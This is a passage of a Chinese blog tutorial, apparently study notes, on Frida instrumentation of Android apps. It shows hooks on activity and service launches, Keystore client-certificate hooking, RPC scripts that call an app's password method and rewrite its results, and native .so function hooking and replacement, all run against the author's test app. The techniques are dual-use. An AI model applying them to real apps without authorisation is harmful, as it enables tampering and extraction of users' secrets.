class="string">&quot;,p2=&quot;</span>+p2);</span><br><span class="line">        <span class="comment">//console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()));</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">decodeURIComponent</span>(p1.toUri(<span class="number">256</span>)));</span><br><span class="line">        <span class="built_in">this</span>.startActivity(p1,p2);</span><br><span class="line">    &#125;</span><br><span class="line">    Activity.startService.overload(<span class="string">&#x27;android.content.Intent&#x27;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">p1</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Hooking android.app.Activity.startService(p1) successfully,p1=&quot;</span>+p1);</span><br><span class="line">        <span class="comment">//console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()));</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">decodeURIComponent</span>(p1.toUri(<span class="number">256</span>)));</span><br><span class="line">        <span class="built_in">this</span>.startService(p1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="hook-onClick事件-定位">hook onClick事件 定位<a class="header-anchor" href="#hook-onClick事件-定位"> ¶ </a></h4>
<script src="https://gist.github.com/Forgo7ten/cc325b0c1158babe6c9326e18c4860b3.js"></script>
<h3 id="hook-Keystore：客户端证书校验">hook Keystore：客户端证书校验<a class="header-anchor" href="#hook-Keystore：客户端证书校验"> ¶ </a></h3>
<script src="https://gist.github.com/Forgo7ten/102d46e2f478ddadec0d2350ac8723e3.js"></script>
<h2 id="Frida-RPC-Remote-procedure-call">Frida RPC(Remote procedure call)<a class="header-anchor" href="#Frida-RPC-Remote-procedure-call"> ¶ </a></h2>
<ul>
<li>
<p>Frida(rpc)开到公网：</p>
<p>通过vps安装NPS来将公网的流量转发到手机相应端口</p>
</li>
<li>
<p>利用<code>flask</code>开启网址服务</p>
<p>利用python <code>flask</code>库，将主动调用函数映射为网址服务，只要访问即可调用app中方法</p>
</li>
</ul>
<h3 id="RPC主动调用">RPC主动调用<a class="header-anchor" href="#RPC主动调用"> ¶ </a></h3>
<p><strong>rpc.exports导出名不可以有大写字母或者下划线</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 搜索HookedObject类实例</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;found HookedObject:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// 查找到实例后主动调用方法</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;ho.getPasswd():&quot;</span>, instance.getPasswd(<span class="string">&quot;123 ABC&quot;</span>));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;HookedObject: search complete.&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 测试函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;I&#x27;m Frida_rpc.js!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 导出函数列表(可供py调用的) py函数映射和实际函数名 */</span></span><br><span class="line">rpc.exports = &#123;</span><br><span class="line">    <span class="attr">invokefunc</span>: invoke,</span><br><span class="line">    <span class="attr">testfunc</span>: test,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | script脚本信息交互函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message,payload</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Usb连接设备</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过ip:port 连接设备</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ 通过spawn方式启动 ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ 通过attach现有进程方式启动 ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 创建一个新脚本</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 加载信息交互handler函数</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line"><span class="comment"># 加载脚本</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter Command(y/t/n): &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;t&quot;</span>:</span><br><span class="line">        script.exports.testfunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="rpc动态修改">rpc动态修改<a class="header-anchor" href="#rpc动态修改"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).getPasswd.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 需要发送给python的字符串：由函数的参数和结果拼接而成</span></span><br><span class="line">        <span class="keyword">var</span> string_to_send = <span class="built_in">arguments</span>[<span class="number">0</span>] + <span class="string">&quot;:&quot;</span> + <span class="built_in">this</span>.getPasswd(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        <span class="comment">// 发送到python程序</span></span><br><span class="line">        send(string_to_send);</span><br><span class="line">        <span class="comment">// 同时调用.wait()来 阻塞运行，等待接收消息</span></span><br><span class="line">        recv(<span class="function"><span class="keyword">function</span> (<span class="params">received_json_objection</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 接收来的json字符串</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;recv in js:&quot;</span>,<span class="built_in">JSON</span>.stringify(received_json_objection))</span><br><span class="line">            <span class="comment">// 打印json的`my_data`,json串来自python</span></span><br><span class="line">            string_to_recv = received_json_objection.my_data;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;string_to_recv:&quot;</span>, string_to_recv);</span><br><span class="line">        &#125;).wait();</span><br><span class="line">        <span class="comment">// 将接收到的字符串当作被hook函数的结果返回回去</span></span><br><span class="line">        <span class="keyword">var</span> result = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(string_to_recv);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | script脚本信息交互函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message, payload</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(message)  <span class="comment"># 打印得到的信息</span></span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 输出的为`none`?</span></span><br><span class="line">    <span class="comment"># 如果`type`字段为&quot;send&quot; 则是js发来的消息</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="comment"># 打印json的`payload`内容(js发送过来的内容)</span></span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">        <span class="comment"># 向script发送消息，格式为字典</span></span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Usb连接设备</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过ip:port 连接设备</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ 通过spawn方式启动 ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ 通过attach现有进程方式启动 ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 创建一个新脚本</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 加载信息交互handler函数</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line"><span class="comment"># 加载脚本</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter `n` for leave: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="More">More<a class="header-anchor" href="#More"> ¶ </a></h3>
<p><a href="https://github.com/frida/frida-python/tree/main/examples">frida-python/examples at main · frida/frida-python (github.com)</a></p>
<h2 id="Frida-native层应用">Frida native层应用<a class="header-anchor" href="#Frida-native层应用"> ¶ </a></h2>
<p>Frida实现的Env：<a href="https://github.com/frida/frida-java-bridge/blob/main/lib/env.js">frida-java-bridge/env.js at main · frida/frida-java-bridge (github.com)</a></p>
<h3 id="判断Thumb-OR-arm">判断Thumb OR arm<a class="header-anchor" href="#判断Thumb-OR-arm"> ¶ </a></h3>
<p>判断Thumb OR arm模式：</p>
<ul>
<li>IDA查看指令机器码长度，都为4字节为arm指令</li>
<li><code>push</code>指令为thumb指令特有</li>
</ul>
<h3 id="hook用户函数">hook用户函数<a class="header-anchor" href="#hook用户函数"> ¶ </a></h3>
<h4 id="attach静态注册-或导出-函数">attach静态注册(或导出)函数<a class="header-anchor" href="#attach静态注册-或导出-函数"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* hook 可导出的native函数 */</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 寻找模块so的地址</span></span><br><span class="line">        <span class="keyword">var</span> lib_fridatestapp_addr = Module.findBaseAddress(<span class="string">&quot;libfridatestapp.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;native_lib_addr -&gt; &quot;</span>, lib_fridatestapp_addr);</span><br><span class="line">        <span class="comment">// 寻找导出函数的地址</span></span><br><span class="line">        <span class="keyword">var</span> staticString_addr = Module.findExportByName(<span class="string">&quot;libfridatestapp.so&quot;</span>, <span class="string">&quot;Java_com_forgotten_fridatestapp_MainActivity_staticString&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;staticString() addr -&gt; &quot;</span>, staticString_addr);</span><br><span class="line">        <span class="comment">// 对函数进行attach</span></span><br><span class="line">        Interceptor.attach(staticString_addr, &#123;</span><br><span class="line">            <span class="comment">// 函数进入时，参数为函数的参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="comment">/* 打印native函数调用栈，有Backtracer.ACCURATE和Backtracer.FUZZY两种模式切换 */</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;CCCryptorCreate called from:\n&quot;</span> + Thread.backtrace(<span class="built_in">this</span>.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(<span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 打印三个参数地址</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">// 将 参数三传进去的jstring字符串，转换为char*再用readCString()得到JavaScript字符串来输出</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;jstring is&quot;</span>, Java.vm.getEnv().getStringUtfChars(args[<span class="number">2</span>], <span class="literal">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 可以对参数进行修改</span></span><br><span class="line">                <span class="keyword">var</span> new_arg2 = Java.vm.getEnv().newStringUtf(<span class="string">&quot;new arg2 from Frida&quot;</span>);</span><br><span class="line">                args[<span class="number">2</span>] = new_arg2;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 函数执行完的时候，参数为函数的返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">reval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() retval&quot;</span>, reval);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() retval&quot;</span>, Java.vm.getEnv().getStringUtfChars(reval, <span class="literal">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 对函数的返回值进行替换</span></span><br><span class="line">                <span class="keyword">var</span> new_reval = Java.vm.getEnv().newStringUtf(<span class="string">&quot;HaHa Frida!!!&quot;</span>);</span><br><span class="line">                reval.replace(new_reval);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="主动调用静态注册-或导出-函数">主动调用静态注册(或导出)函数<a class="header-anchor" href="#主动调用静态注册-或导出-函数"> ¶ </a></h4>
<p>注册native函数：<code>new NativeFunction(address, returnType, argTypes[, abi])</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* 主动调用 可导出的native函数 */</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">invoke_justAdd_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 寻找模块so的地址</span></span><br><span class="line">        <span class="keyword">var</span> lib_fridatestapp_addr = Module.findBaseAddress(<span class="string">&quot;libfridatestapp.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;native_lib_addr -&gt; &quot;</span>, lib_fridatestapp_addr);</span><br><span class="line">        <span class="comment">// 寻找导出函数的地址</span></span><br><span class="line">        <span class="keyword">var</span> justAdd_addr = Module.findExportByName(<span class="string">&quot;libfridatestapp.so&quot;</span>, <span class="string">&quot;_Z7justAddii&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;justAdd() addr -&gt; &quot;</span>, justAdd_addr);</span><br><span class="line">        <span class="comment">// 新建一个Native函数，参数分别为 已存在函数地址，函数返回值类型，函数参数列表</span></span><br><span class="line">        <span class="keyword">var</span> justAdd_func = <span class="keyword">new</span> NativeFunction(justAdd_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>]);</span><br><span class="line">        <span class="comment">// 执行函数，获得函数返回值</span></span><br><span class="line">        <span class="keyword">var</span> justAdd_result = justAdd_func(<span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;invoke justAdd(10,2) result-&gt; &quot;</span>, justAdd_result);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">invoke_nativeString_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* 大部分代码同 hook函数中的 */</span></span><br><span class="line">        <span class="comment">// 寻找模块so的地址</span></span><br><span class="line">        <span class="keyword">var</span> lib_fridatestapp_addr = Module.findBaseAddress(<span class="string">&quot;libfridatestapp.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;native_lib_addr -&gt; &quot;</span>, lib_fridatestapp_addr);</span><br><span class="line">        <span class="comment">// 寻找导出函数的地址</span></span><br><span class="line">        <span class="keyword">var</span> staticString_addr = Module.findExportByName(<span class="string">&quot;libfridatestapp.so&quot;</span>, <span class="string">&quot;Java_com_forgotten_fridatestapp_MainActivity_staticString&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;staticString() addr -&gt; &quot;</span>, staticString_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 声明该native函数，返回值和参数env、jobject等都是&quot;pointer&quot; */</span></span><br><span class="line">        <span class="keyword">var</span> nativeString_func = <span class="keyword">new</span> NativeFunction(staticString_addr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对函数进行attach</span></span><br><span class="line">        Interceptor.attach(staticString_addr, &#123;</span><br><span class="line">            <span class="comment">// 函数进入时，参数为函数的参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 打印三个参数地址</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">// 将 参数三传进去的jstring字符串，转换为char*再用readCString()得到JavaScript字符串来输出</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;jstring is&quot;</span>, Java.vm.getEnv().getStringUtfChars(args[<span class="number">2</span>], <span class="literal">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* 主动调用方法，打印函数结果 */</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;==&gt; invoke stringfunc(): &quot;</span>, Java.vm.getEnv().getStringUtfChars(nativeString_func(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>]), <span class="literal">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 可以对参数进行修改</span></span><br><span class="line">                <span class="keyword">var</span> new_arg2 = Java.vm.getEnv().newStringUtf(<span class="string">&quot;new arg2 from Frida&quot;</span>);</span><br><span class="line">                args[<span class="number">2</span>] = new_arg2;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 函数执行完的时候，参数为函数的返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">reval</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() retval&quot;</span>, reval);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Interceptor.attach staticString() retval&quot;</span>, Java.vm.getEnv().getStringUtfChars(reval, <span class="literal">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 对函数的返回值进行替换</span></span><br><span class="line">                <span class="keyword">var</span> new_reval = Java.vm.getEnv().newStringUtf(<span class="string">&quot;HaHa Frida!!!&quot;</span>);</span><br><span class="line">                reval.replace(new_reval);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="replace静态注册-或导出-函数">replace静态注册(或导出)函数<a class="header-anchor" href="#replace静态注册-或导出-函数"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* 替换 justAdd函数 */</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">replace_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 寻找模块so的地址</span></span><br><span class="line">        <span class="keyword">var</span> lib_fridatestapp_addr = Module.findBaseAddress(<span class="string">&quot;libfridatestapp.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;native_lib_addr -&gt; &quot;</span>, lib_fridatestapp_addr);</span><br><span class="line">        <span class="comment">// 寻找导出函数的地址</span></span><br><span class="line">        <span class="keyword">var</span> justAdd_addr = Module.findExportByName(<span class="string">&quot;libfridatestapp.so&quot;</span>, <span class="string">&quot;_Z7justAddii&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;justAdd() addr -&gt; &quot;</span>, justAdd_addr);</span><br><span class="line">        <span class="comment">// 对原native函数进行替换，参数1为替换的地址，参数2为一个NativeCallback</span></span><br><span class="line">        Interceptor.replace(</span><br><span class="line">            justAdd_addr,</span><br><span class="line">            <span class="keyword">new</span> NativeCallback(</span><br><span class="line">                <span class="comment">// 参数分别为，替换执行的函数，返回值类型，参数类型列表</span></span><br><span class="line">                <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;justAdd args: &quot;</span>, a, b);</span><br><span class="line">                    <span class="keyword">var</span> result = a * (b + <span class="number">5</span>);</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;new Func Result: &quot;</span>, result);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>,</span><br><span class="line">                [<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>]</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="通过地址偏移操作未导出函数">通过地址偏移操作未导出函数<a class="header-anchor" href="#通过地址偏移操作未导出函数"> ¶ </a></h4>
<p>通过ida找到函数偏移</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">main3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 靠地址偏移hook未导出函数  */</span></span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        <span class="comment">// 寻找模块so的地址</span></span><br><span class="line">        <span class="keyword">var</span> lib_fridatestapp_addr = Module.findBaseAddress(<span class="string">&quot;libfridatestapp.so&quot;</span>);</span><br><span class="line">        console.log(<span class="string">&quot;native_lib_addr -&gt; &quot;</span>, lib_fridatestapp_addr);</span><br><span class="line">        <span class="comment">// 通过函数偏移+模块的地址，得到函数的地址</span></span><br><span class="line">        <span class="keyword">var</span> dynamicString_addr = lib_fridatestapp_addr.add(<span class="number">0xa48</span>);</span><br><span class="line">        console.log(<span class="string">&quot;dynamicString() addr -&gt; &quot;</span>, dynamicString_addr);</span><br><span class="line">        <span class="comment">// 对函数进行attach</span></span><br><span class="line">        Interceptor.attach(dynamicString_addr, &#123;</span><br><span class="line">            <span class="comment">// 函数进入时，参数为函数的参数</span></span><br><span class="line">            onEnter: function (args) &#123;</span><br><span class="line">                <span class="comment">/* 打印native函数调用栈，有Backtracer.ACCURATE和Backtracer.FUZZY两种模式切换 */</span></span><br><span class="line">                <span class="comment">// console.log(&quot;CCCryptorCreate called from:\n&quot; + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(&quot;\n&quot;) + &quot;\n&quot;);</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 打印三个参数地址</span></span><br><span class="line">                console.log(<span class="string">&quot;Interceptor.attach dynamicString() args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">// 将 参数三传进去的jstring字符串，转换为char*再用readCString()得到JavaScript字符串来输出</span></span><br><span class="line">                <span class="comment">// console.log(&quot;jstring is&quot;, Java.vm.getEnv().getStringUtfChars(args[2], null).readCString());</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 可以对参数进行修改</span></span><br><span class="line">                <span class="keyword">var</span> new_arg2 = Java.vm.getEnv().newStringUtf(<span class="string">&quot;new arg2 from Frida&quot;</span>);</span><br><span class="line">                args[<span class="number">2</span>] = new_arg2;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 函数执行完的时候，参数为函数的返回值</span></span><br><span class="line">            onLeave: function (reval) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;Interceptor.attach dynamicString() retval&quot;</span>, reval);</span><br><span class="line">                console.log(<span class="string">&quot;Interceptor.attach dynamicString() retval&quot;</span>, Java.vm.getEnv().getStringUtfChars(reval, <span class="keyword">null</span>).readCString());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 对函数的返回值进行替换</span></span><br><span class="line">                <span class="keyword">var</span> new_reval = Java.vm.getEnv().newStringUtf(<span class="string">&quot;HaHa Frida!!!&quot;</span>);</span><br><span class="line">                <span class="comment">// reval.replace(new_reval);</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="模块相关操作">模块相关操作<a class="header-anchor" href="#模块相关操作"> ¶ </a></h3>
<h4 id="枚举出所有模块的所有导出符号">枚举出所有模块的所有导出符号<a class="header-anchor" href="#枚举出所有模块的所有导出符号"> ¶ </a></h4>
